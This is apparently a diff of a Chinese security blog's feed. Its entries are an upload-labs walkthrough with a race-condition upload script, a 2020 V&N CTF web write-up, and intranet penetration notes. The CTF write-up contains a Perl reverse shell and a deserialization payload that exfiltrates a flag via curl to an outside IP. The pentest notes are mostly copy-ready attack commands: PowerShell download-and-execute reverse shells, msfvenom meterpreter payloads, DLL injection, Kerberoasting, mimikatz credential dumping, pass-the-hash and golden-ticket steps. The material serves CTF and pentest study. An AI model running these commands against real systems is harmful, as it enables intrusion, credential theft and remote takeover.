+<p>提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg" target="_blank" rel="noopener">示例文件</a>。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。</p>
+<p>从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png" target="_blank" rel="noopener">示例文件</a>即可，并不需要图片是正常的图片。</p>
+<p>程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。</p>
+<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>条件竞争</p>
+<pre><code class="python">#!/usr/bin/env python
+# coding:utf-8
+# Build By LandGrey
+
+import hackhttp
+from multiprocessing.dummy import Pool as ThreadPool
+
+
+def upload(lists):
+    hh = hackhttp.hackhttp()
+    raw = &quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1
+Host: localhost:8089
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8089/upload-labs/Pass-17/index.php
+Content-Type: multipart/form-data; boundary=---------------------------287032381131322
+Content-Length: 334
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+-----------------------------287032381131322
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;
+Content-Type: application/octet-stream
+
+&lt;?php
+ phpinfo();
+ ?&gt;
+-----------------------------287032381131322
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+ä¸ä¼ 
+-----------------------------287032381131322--
+&quot;&quot;&quot;
+    code, head, html, redirect, log = hh.http(&#39;http://localhost:8089/upload-labs/Pass-17/index.php&#39;, raw=raw)
+    print(str(code) + &quot;\r&quot;)
+
+
+pool = ThreadPool(10)
+pool.map(upload, range(10000))
+pool.close()
+pool.join()</code></pre>
+]]></content>
+      <tags>
+        <tag>PRACTICE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 V&amp;N CTF Web</title>
+    <url>/2020/03/01/%C2%96%C2%962020-V-N-CTF-Web/</url>
+    <content><![CDATA[<p>有很多地方没有转过来，思维过于僵硬，感谢赵师傅出的精美题目</p>
+<a id="more"></a>
+
+<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>CTFd 的漏洞</p>
+<p>简单来说来说就是注册带空格恶意用户名然后忘记密码进行修改</p>
+<p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p>
+<h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>找了亿个反弹 shell，下面是有用的一个</p>
+<blockquote>
+<p><a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+</blockquote>
+<pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.216.98:9000&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p>系统没有 losf、ps 等进程命令，所以自己逐个去 /proc 找</p>
+<pre><code>app@362cb9dcadd1:/proc$ cd 10
+app@362cb9dcadd1:/proc/10$ cd fd
+app@362cb9dcadd1:/proc/10/fd$ ls -al
+total 0
+dr-x------ 2 app app  0 Feb 29 05:47 .
+dr-xr-xr-x 9 app app  0 Feb 29 05:43 ..
+lrwx------ 1 app app 64 Feb 29 05:47 0 -&gt; /dev/null
+l-wx------ 1 app app 64 Feb 29 05:47 1 -&gt; &#39;pipe:[421276576]&#39;
+l-wx------ 1 app app 64 Feb 29 05:47 2 -&gt; &#39;pipe:[421276577]&#39;
+lr-x------ 1 app app 64 Feb 29 05:47 3 -&gt; &#39;/home/app/flag.txt (deleted)&#39;
+lrwx------ 1 app app 64 Feb 29 05:47 4 -&gt; &#39;socket:[421292108]&#39;
+app@362cb9dcadd1:/proc/10/fd$ cat 3
+flag{85693908-b5aa-4f03-96a8-133fc30854d3}</code></pre><h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>phpinfo 没有读到有用的信息</p>
+<p>读 composer.json 文件根据组件查找 CVE</p>
+<pre><code>{
+    &quot;require&quot;:{
+        &quot;guzzlehttp/guzzle&quot;:&quot;6.2.0&quot;
+    }</code></pre><p><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">https://www.laruence.com/2016/07/19/3101.html</a></p>
+<p>开一台内网主机</p>
+<pre><code># index.php
+&lt;?php
+        $arr = array(&quot;success&quot;=&gt;true);
+        header(&quot;Content-Type:application/json&quot;);
+        echo json_encode($arr);
+# 执行 php -S 0:9999</code></pre><pre><code>Proxy: http://174.0.216.98:9999</code></pre><h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>javaweb 的题目</p>
+<p>这里用 Tools 类生成 cookies，而 Tools 类继承序列化类，所以 cookies 有反序列化操作</p>
+<pre><code class="java">// springmvcdemo.war!\WEB-INF\classes\com\filters\ClentInfoFilter.class
+String b64 = cookie.getValue();
+      Base64.Decoder decoder = Base64.getDecoder();
+      byte[] bytes = decoder.decode(b64);
+      ClientInfo cinfo = null;
+      if ((b64.equals(&quot;&quot;)) || (bytes == null))
+      {
+        cinfo = new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId());
+        Base64.Encoder encoder = Base64.getEncoder();
+        try
+        {
+          bytes = Tools.create(cinfo);
+        }
+        catch (Exception e)
+        {
+          e.printStackTrace();
+        }
+        cookie.setValue(encoder.encodeToString(bytes));</code></pre>
+<p>PictureController.class 存在文件上传和文件包含，需要伪造成 admin，webmanager，我们直接在任意一个 jsp 页面运行以下代码覆盖原 cookies 就可以拿去文件上传了。</p>
+<pre><code class="jsp">&lt;%
+    ClientInfo cinfo = new ClientInfo(&quot;admin&quot;, &quot;webmanager&quot;, ((HttpServletRequest)request).getRequestedSessionId());
+    byte[] bytes = Tools.create(cinfo);
+    cookie = new Cookie(&quot;cinfo&quot;, encoder.encodeToString(bytes));
+    cookie.setMaxAge(86400);
+    ((HttpServletResponse)response).addCookie(cookie);
+    ((HttpServletRequest)request).getSession().setAttribute(&quot;cinfo&quot;, cinfo);
+%&gt;</code></pre>
+<p>但是文件上传只能通过修改文件名存储到 /tmp 目录，jsp 文件包含除了 jpg 和 gif 只能取到文件名，所以此处文件包含是不可取了。赛后看了其他大哥的博客，原来是 <code>ProcessBuilder</code>漏洞。</p>
+<pre><code class="java">  // springmvcdemo.war!\WEB-INF\classes\com\tools\Tools.class
+  private void readObject(ObjectInputStream in)
+    throws IOException, ClassNotFoundException
+  {
+    Object obj = in.readObject();
+    new ProcessBuilder((String[])obj).start();
+  }</code></pre>
+<p>这里我们可以通过重写<code>writeObject</code>方法来实现，来构造一个字符串传给<code>ProcessBuilder</code>执行命令</p>
+<pre><code class="java">private void writeObject(ObjectOutputStream out) throws IOException {
+        String[] cmd = {&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;curl http://174.0.218.99:9000/`/readflag`&quot;};
+        out.writeObject(cmd);
+}</code></pre>
+<p>在 Tools 类里加上上面的函数，然后生成序列化的 cookies，带上去另一边监听即可得到 flag</p>
+<pre><code class="java">import java.io.*;
+import java.util.Base64;
+import com.tools.*;
+public class exp {
+    public static void main(String[] args) {
+        Base64.Encoder encoder = Base64.getEncoder();
+        try {
+            Tools cinfo = new Tools();
+            byte[] bytes = Tools.create(cinfo);
+            String payload = encoder.encodeToString(bytes);
+            System.out.println(payload);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+}</code></pre>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -5009,349 +5198,6 @@ Referer: https://ctf.bsidessf.net/challenges</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>内网渗透——Kerberos篇（待更新）</title>
-    <url>/2020/05/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E7%AF%87%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
-    <content><![CDATA[<p>对内网渗透一些东西的小记录</p>
-<a id="more"></a>
-
-<h2 id="WinXP配置PowerShell"><a href="#WinXP配置PowerShell" class="headerlink" title="WinXP配置PowerShell"></a>WinXP配置PowerShell</h2><ol>
-<li><p>安装.NET Framework 2.0 Service Pack 2</p>
-<p><a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=1639" target="_blank" rel="noopener">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=1639</a></p>
-</li>
-<li><p>安装WindowsXP-KB926140-v5-x86-CHS.exe</p>
-<p><a href="https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html" target="_blank" rel="noopener">https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html</a></p>
-</li>
-</ol>
-<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><pre><code class="cmd"># Attacker
-nc -vlp 9999
-
-# Victim
-nc.exe 192.168.255.128 9999 -e c:\WINDOWS\system32\cmd.exe</code></pre>
-<h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a> </p>
-<pre><code class="cmd"># Attacker
-nc -lvp 6666 或 powercat -l -p 6666
-
-# Victim
-powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);
-powercat -c 192.168.255.128 -p 6666 -e cmd</code></pre>
-<h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
-<h3 id="Reverse-TCP-Shell"><a href="#Reverse-TCP-Shell" class="headerlink" title="Reverse TCP Shell"></a>Reverse TCP Shell</h3><pre><code class="cmd"># Attacker
-nc -lvp 6666
-
-# Victim
-powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.255.128 -port 6666
-或
-powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.255.128/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.255.128 -port 6666</code></pre>
-<h3 id="Reverse-UDP-Shell"><a href="#Reverse-UDP-Shell" class="headerlink" title="Reverse UDP Shell"></a>Reverse UDP Shell</h3><pre><code class="cmd"># Attacker
-nc -lvup 53
-
-# Victim
-powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1&#39;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.255.128 -port 53</code></pre>
-<h3 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h3><p>icmpsh_m.py：<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p>
-<pre><code class="cmd"># Attacker
-sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包
-python icmpsh_m.py 192.168.255.128 192.168.255.130 #开启监听
-
-# Victim
-powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.255.128/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp -IPAddress 192.168.255.130</code></pre>
-<h3 id="自定义payload"><a href="#自定义payload" class="headerlink" title="自定义payload"></a>自定义payload</h3><pre><code class="cmd"># Attacker
-nc -lvp 6666
-
-# Victim
-powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&#39;192.168.255.128&#39;,6666);$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
-$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );
-$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre>
-<h3 id="Reverse-DNS-Shell"><a href="#Reverse-DNS-Shell" class="headerlink" title="Reverse DNS Shell"></a>Reverse DNS Shell</h3><p>dnscat2：<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a> </p>
-<pre><code class="cmd"># Attacker
-ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.255.128&quot; --no-cache -e open
-
-# Victim
-powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.255.128</code></pre>
-<h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><p>PowerSploit：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
-<pre><code class="cmd"># Attacker
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.255.128 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll
-
-# Victim
-Get-Process #选择要注入的进程 Id
-IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.255.128/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)
-Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll</code></pre>
-<h3 id="MSF-Reverse-Shell"><a href="#MSF-Reverse-Shell" class="headerlink" title="MSF Reverse Shell"></a>MSF Reverse Shell</h3><pre><code class="cmd"># Attacker
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.128 LPORT=4444 -f exe -o tcpshell.exe
-
-# Victim
-tcpshell.exe</code></pre>
-<h2 id="信息收集（简）"><a href="#信息收集（简）" class="headerlink" title="信息收集（简）"></a>信息收集（简）</h2><pre><code class="cmd">ipconfig /all    
-# 查询本机IP段，所在域等
-net config Workstation    
-# 当前计算机名，全名，用户名，系统版本，工作站域，登陆域
-net user    
-# 本机用户列表
-net localgroup administrators    
-# 本机管理员[通常含有域用户]
-net user /domain    
-# 查询域用户
-net user 用户名 /domain    
-# 获取指定用户的账户信息
-net user /domain b404 pass    
-# 修改域内用户密码，需要管理员权限
-net group /domain    
-# 查询域里面的工作组
-net group 组名 /domain    
-# 查询域中的某工作组
-net group &quot;domain admins&quot; /domain    
-# 查询域管理员列表
-net group &quot;domain controllers&quot; /domain    
-# 查看域控制器(如果有多台)
-net time /domain    
-# 判断主域，主域服务器都做时间服务器
-ipconfig /all    
-# 查询本机IP段，所在域等</code></pre>
-<h2 id="Kereros-协议（简）"><a href="#Kereros-协议（简）" class="headerlink" title="Kereros 协议（简）"></a>Kereros 协议（简）</h2><ul>
-<li>客户机将明文密码进行NTLM哈希，然后和时间戳一起加密（使用KRBTGT密码hash作为密钥），发送给KDC（域控），KDC对用户进行检测，成功之后创建TGT（票据授权票据）</li>
-<li>将TGT进行加密签名返回给客户机器，只有域用户KRBTGT才能读取Kerberos中TGT数据</li>
-<li>然后客户机将TGT发送给KDC请求TGS（票证授权服务）票证，并且对TGT进行检测</li>
-<li>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</li>
-</ul>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="Kerberoating"><a href="#Kerberoating" class="headerlink" title="Kerberoating"></a>Kerberoating</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解。对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令（无法用于远程连接）。</p>
-<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
-<li>查询SPN，找到有价值的SPN，需要满足以下条件：<ul>
-<li>该SPN注册在域用户帐户(Users)下</li>
-<li>域用户账户的权限很高</li>
-</ul>
-</li>
-<li>请求TGS</li>
-<li>导出TGS</li>
-<li>暴力破解</li>
-</ol>
-<h4 id="手工导出"><a href="#手工导出" class="headerlink" title="手工导出"></a>手工导出</h4><ol>
-<li><p>获取有价值的SPN</p>
-<ol>
-<li><p>使用powershell模块Active Directory</p>
-<blockquote>
-<p>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>
-<p>导入命令：</p>
-<p>import-module .\Microsoft.ActiveDirectory.Management.dll</p>
-<p>下载地址：</p>
-<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
-</blockquote>
-<pre><code class="cmd">import-module ActiveDirectory
-get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon</code></pre>
-</li>
-<li><p>使用PowerView</p>
-<p>脚本地址：</p>
-<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
-<pre><code class="cmd">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre>
-</li>
-<li><p>使用kerberoast</p>
-<p>脚本地址：</p>
-<p>（powershell）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
-<p>（vbs）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
-<pre><code class="cmd">cscript GetUserSPNs.vbs</code></pre>
-</li>
-</ol>
-</li>
-<li><p>请求TGS，执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS。</p>
-<ol>
-<li><p>请求指定TGS</p>
-<pre><code class="cmd">$SPNName = &#39;MSSQLSvc/DC1.test.com&#39;
-Add-Type -AssemblyNAme System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre>
-</li>
-<li><p>请求所有TGS</p>
-<pre><code class="cmd">Add-Type -AssemblyName System.IdentityModel  
-setspn.exe -q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  </code></pre>
-</li>
-</ol>
-</li>
-<li><p>导出TGS</p>
-<pre><code class="cmd">mimikatz # kerberos::list /export</code></pre>
-</li>
-<li><p>破解</p>
-<p>脚本地址：</p>
-<p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
-<pre><code class="cmd">./tgsrepcrack.py wordlist.txt test.kirbi</code></pre>
-</li>
-</ol>
-<h4 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h4><p>自动实现，并且不需要mimikatz，普通用户权限即可</p>
-<p>参考资料：</p>
-<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
-<p>代码地址：</p>
-<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
-<p><strong>利用步骤</strong></p>
-<ol>
-<li><p>在域内一台主机上以普通用户权限执行</p>
-<pre><code class="cmd">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</code></pre>
-</li>
-<li><p>只提取hash参数</p>
-<pre><code class="cmd">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</code></pre>
-</li>
-<li><p>使用hashcat破解</p>
-<pre><code class="cmd">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</code></pre>
-</li>
-</ol>
-<h3 id="Pth（Pass-the-hash）"><a href="#Pth（Pass-the-hash）" class="headerlink" title="Pth（Pass the hash）"></a>Pth（Pass the hash）</h3><p>直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
-<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ul>
-<li>在Windows系统中，通常会使用NTLM身份认证</li>
-<li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li>
-<li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li>
-<li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li>
-</ul>
-<h4 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h4><ul>
-<li>域/工作组环境</li>
-<li>可以获得hash，但是条件不允许对hash爆破</li>
-<li>内网中存在和当前机器相同的密码</li>
-</ul>
-<blockquote>
-<p>微软对 Pth 打过补丁，但是默认的 Administrator(SID 500) 账号还可以使用 Pth。</p>
-<p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。</p>
-</blockquote>
-<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
-<p>mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息</p>
-<p>对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash</p>
-</blockquote>
-<p>获取 hash</p>
-<pre><code class="cmd">mimikatz # privilege::debug
-mimikatz # sekurlsa::logonpasswords</code></pre>
-<p>pth</p>
-<pre><code class="cmd">mimikatz # sekurlsa::pth /user:[Username] /domain:workgroup /ntlm:[NTLM]</code></pre>
-<h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p><strong>Invoke-TheHash</strong></p>
-<p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
-<pre><code class="cmd">Invoke-Module Invoke-TheHash.psd1Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</code></pre>
-<p><strong>Invoke-SMBExec</strong></p>
-<blockquote>
-<p>支持SMB1，SMB2 (2.1)，and SMB signing，</p>
-</blockquote>
-<pre><code class="cmd">Invoke-SMBExec -Target 192.168.3.21 -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</code></pre>
-<p><strong>Invoke-SMBClient</strong></p>
-<blockquote>
-<p>支持SMB1, SMB2 (2.1), and SMB signing，如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本。</p>
-<p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>
-</blockquote>
-<p><strong>wmiexec.py</strong></p>
-<p><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a></p>
-<p><strong>wmiexec.exe</strong></p>
-<p><a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></p>
-<blockquote>
-<p>wmiexec.exe通过python impacket库实现的，生成的exe有点大，5M大小在实战起来有点不方便</p>
-</blockquote>
-<pre><code class="cmd">wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 &quot;whoami&quot;</code></pre>
-<blockquote>
-<p>wmiexec.py的hash参数格式为 LM Hash:NT Hash ，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值</p>
-</blockquote>
-<h3 id="Ptt（Pass-the-ticket）"><a href="#Ptt（Pass-the-ticket）" class="headerlink" title="Ptt（Pass the ticket）"></a>Ptt（Pass the ticket）</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限。</p>
-<p>利用Kerberos协议进行攻击，三种常用的攻击方法是MS16-068，Golden ticket，Silver ticket。</p>
-<h4 id="MS16-068"><a href="#MS16-068" class="headerlink" title="MS16-068"></a>MS16-068</h4><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心（KDC）中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</p>
-<blockquote>
-<p>ms14-068详细介绍：<a href="https://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/56081.html</a></p>
-<p>微软给出的补丁是kb3011780</p>
-</blockquote>
-<p>简单来说就是：</p>
-<p>windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。</p>
-<ol>
-<li>在请求AS时，将require_PAC设置成False。</li>
-<li>在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。</li>
-<li>TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT。</li>
-</ol>
-<p><strong>利用工具</strong></p>
-<p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">ms14-068</a></p>
-<p><strong>利用步骤</strong></p>
-<ol>
-<li><p>使用 whoami/user 得到普通域用户的sid</p>
-</li>
-<li><p>执行payload生成TGT票据（.ccache文件）</p>
-<pre><code>ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</code></pre></li>
-<li><p>票据注入，使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器，成功后会显示<code>Injecting ticket : OK</code></p>
-<pre><code class="cmd">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
-mimikatz # kerberos::list          //查看当前机器凭证
-mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</code></pre>
-</li>
-</ol>
-<p><strong>利用工具</strong> </p>
-<p><a href="https://github.com/gentilkiwi/kekeo/releases" target="_blank" rel="noopener">kekeo</a></p>
-<p><strong>利用步骤</strong></p>
-<ol>
-<li><p>生成票据</p>
-<pre><code class="cmd">kekeo # &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</code></pre>
-</li>
-<li><p>导入票据</p>
-<pre><code class="cmd">kekeo # &quot;kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot;</code></pre>
-</li>
-</ol>
-<h4 id="Golden-ticket"><a href="#Golden-ticket" class="headerlink" title="Golden ticket"></a>Golden ticket</h4><p><strong>前提条件</strong></p>
-<ul>
-<li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li>
-<li>域名称</li>
-<li>域的SID值</li>
-<li>要伪造的用户名</li>
-</ul>
-<p><strong>利用步骤</strong></p>
-<ol>
-<li><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid</p>
-<pre><code class="cmd">mimikatz # privilege::debug
-mimikatz # lsadump::lsa /patch</code></pre>
-</li>
-<li><p>切换到普通域用户的机器，生成TGT凭证,用户名为administrator</p>
